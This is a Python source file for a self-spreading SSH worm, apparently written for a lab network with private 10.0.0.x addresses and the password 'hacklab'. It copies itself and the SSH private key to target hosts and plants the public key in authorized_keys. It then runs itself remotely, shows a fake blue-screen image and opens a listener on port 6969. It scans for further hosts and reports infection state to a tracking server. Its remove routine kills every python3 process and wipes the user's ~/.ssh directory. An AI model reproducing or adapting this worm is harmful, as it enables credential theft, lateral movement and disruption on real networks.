import subprocess
import socket
import sys
import pty
import select
import os
import requests
import time
import random
import _thread

# constants
PROMPT = "[worm]"
USER = "admin"
PASS = "hacklab"
PATH = "/home/admin/.local/share/applications/"
DESKTOP_PATH = "/home/admin/Desktop/"
SERVER_IP = "10.0.0.76"
DELAY = 3

class Colours:
    blue = '\033[94m'
    green = '\033[92m'
    end = '\033[0m'

class Authentication():
    def __init__(self):
        self.out = b'hello'

    def _waitfor(self, fd, expected):
        # create a polling object
        poll = select.poll()
        # poll from the fd stream
        poll.register(fd, select.POLLIN)
        while True:
            # poll for output
            evt = poll.poll()
            # read the output
            self.out = os.read(fd, 1024)
            # for each expected response
            for str in expected:
                # if this response was expected
                if str in self.out.decode("utf-8"):
                    # return the response
                    return str    
                    
    def ssh_auth(self, fd):
        waiting = True
        while waiting:
            # get the console output
            response = self._waitfor(fd, ["continue", "yes/no", "connected", "password", "worm.py"])
            
            # if yes/no dialogue option
            if response in ["connected", "continue", "yes/no"]:
                # say yes
                os.write(fd, "yes\n".encode("utf-8"))

            #elif response in "worm.py":
            #    waiting = False

            # else if asking for the password
            elif response == "password":
                # enter the password
                os.write(fd, (PASS + "\n").encode("utf-8"))
                # get out of the loop
                waiting = False

        _, exit_status = os.wait()
        # close the stream
        os.close(fd)

    def scp_file(self, host, filename, path):
        pid, fd = pty.fork()
        # executed in child
        if pid == 0:
            # copy the file to the destination
            os.execvp("scp", ["scp", "-o", "StrictHostKeyChecking=no", "-q", filename, USER+"@"+host+":"+path])

        # executed in parent
        elif pid > 0:
            # authorise the ssh session
            self.ssh_auth(fd)

class Payload():
    def __init__(self):
        # need to determine these at this point
        self.ip = socket.gethostbyname(socket.gethostname())
        self.parent_ip = ""
        self.auth = Authentication()

    def run(self, parent_ip):
        try:
            # will run then exit
            _thread.start_new_thread(self.visual, ())

            # will continue to run in the background
            _thread.start_new_thread(self.post, (parent_ip,))
            _thread.start_new_thread(self.server, ())
            _thread.start_new_thread(self.scanner, ())
        except Exception as e:
            print("unable to start threads :(")
            print(e)

        while True:
            time.sleep(5)
            
    def visual(self):
        # set the background to bsod
        my_env = os.environ
        my_env["DISPLAY"] = ":0"
        subprocess.run(["xhost", "+"], env=my_env)
        subprocess.run(["eog", "--fullscreen", PATH + "bsod.png"], env=my_env)

    def post(self, parent_ip):
        # run in the background
        time.sleep(DELAY)
        # inform server that this host is infected
        try:
            # get the current worm status
            worm = requests.get("http://" + SERVER_IP + ":8000/api/worms/" + self.ip + "/?format=json")
            # if the host isn't known to the server
            if "detail" in worm.text:
                # add the host to the server
                myjson = {'ip': self.ip, 'parent_ip': parent_ip, 'state': '1'}
                requests.post("http://" + SERVER_IP + ":8000/api/worms/", data = myjson)
            else:
                # change the infection state to "infected"
                myjson = {'state': '1'}
                requests.patch("http://" + SERVER_IP + ":8000/api/worms/" + self.ip + "/?format=json", data = myjson)
        except:
            pass            
    
    # work in progress
    def scanner(self):
        to_infect = ["10.0.0.70", "10.0.0.71", "10.0.0.72", "10.0.0.73", "10.0.0.74", "10.0.0.77", "10.0.0.78", "10.0.0.79", "10.0.0.80"]

        while True:
            host = random.choice(to_infect)
            try:
                print("checking " + host + " if already infected")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, 6969))
                print("connected")
                s.sendall(b"hello")
                response = s.recv(1024)
                print("it is infected")
                if response:
                    try:
                        myjson = {'state': '1'}
                        requests.patch("http://" + SERVER_IP + ":8000/api/worms/" + host + "/?format=json", data = myjson)
                    except:
                        pass
            except Exception as e:
                worm = requests.get("http://" + SERVER_IP + ":8000/api/worms/" + host + "/?format=json")
                # if the host isn't known to the server
                if "detail" in worm.text:
                    # add the host to the server
                    myjson = {'ip': host, 'parent_ip': self.ip}
                    requests.post("http://" + SERVER_IP + ":8000/api/worms/", data = myjson)
                else:
                    # patch the state to "disinfected"
                    myjson = {'state': '2'}
                    requests.patch("http://" + SERVER_IP + ":8000/api/worms/" + self.ip + "/?format=json", data = myjson)
                time.sleep(DELAY)
                print("infecting")
                subprocess.run(["python3", PATH + "worm.py", "infect", host])
                time.sleep(DELAY)
        
    def server_thread(self, conn):
        while True:
            data = conn.recv(1024)
            if not data:
                break
            # whenever data is recieved, send "infected"
            conn.sendall(b"infected")
    
    def server(self):
        # create an INET, STREAMing socket
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # bind the socket to a port
        serversocket.bind((socket.gethostname(), 6969))
        # become a server socket
        serversocket.listen()
        while True:
            conn, host = serversocket.accept()
            # connection recieved, start a new thread
            _thread.start_new_thread(self.server_thread(conn), (conn,))

class Worm():
    def __init__(self):
        self.auth = Authentication()

    #infect
    def infect(self, target):
        PROMPT = "[" + target + "]"

        print(Colours.blue + PROMPT, "propagating to", target, Colours.end)

        # copy the worm file
        print(PROMPT, "Copying worm")
        self.auth.scp_file(target, PATH + "worm.py", PATH)
        self.auth.scp_file(target, PATH + "bsod.png", PATH)

        # copy the ssh private key
        print(PROMPT, "Copying private key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa", "/home/admin/.ssh/")

        # copy the ssh public key
        print(PROMPT, "Copying public key")
        self.auth.scp_file(target, "/home/admin/.ssh/id_rsa.pub", "/home/admin/.ssh/authorized_keys")
        subprocess.run(["ssh", "-o", "StrictHostKeyChecking=no", USER+"@"+target, "cp", "/home/admin/.ssh/authorized_keys", "/home/admin/.ssh/id_rsa.pub"])

        print(Colours.green + PROMPT, "All files successfully transferred", Colours.end)

        # run the worm
        print(PROMPT, "Executing on", target)
        self.execute(target)

        print(Colours.green + PROMPT, "worm running on", target, Colours.end)

    #execute
    def execute(self, target):
        # run the worm on the target
        ip = socket.gethostbyname(socket.gethostname())
        subprocess.run(["ssh", USER+"@"+target, "nohup", "python3", PATH + "worm.py payload", ip, ">", "/dev/null", "2>&1", "&"])

    #remove
    def remove(self, target):
        PROMPT = "[" + target + "]"

        # kill the worm process
        print(PROMPT, "Killing worm process")
        subprocess.run(["ssh", USER+"@"+target, "killall", "-9", "python3"])
        subprocess.run(["ssh", USER+"@"+target, "kill", "$(", "ps", "-e", "aux", "|", "grep", "eog", "|", "awk", "'{print $2}'", ")"])

        # remove all files
        print(PROMPT, "Removing all files")
        subprocess.run(["ssh", USER+"@"+target, "rm", PATH+"worm.py", PATH+"bsod.png", "/home/admin/.ssh/*"])
        
if __name__ == "__main__":
    worm = Worm()
    payload = Payload()

    if len(sys.argv) < 2:
        print(PROMPT, "need an argument")
    elif sys.argv[1] == "payload" and len(sys.argv) == 3:
        payload.run(sys.argv[2])
    elif sys.argv[1] == "remove" and len(sys.argv) == 3:
        worm.remove(sys.argv[2])
    elif sys.argv[1] == "infect" and len(sys.argv) == 3:
        worm.infect(sys.argv[2])
    else:
        print(PROMPT, "Not a valid argument, options are: payload, remove and infect")
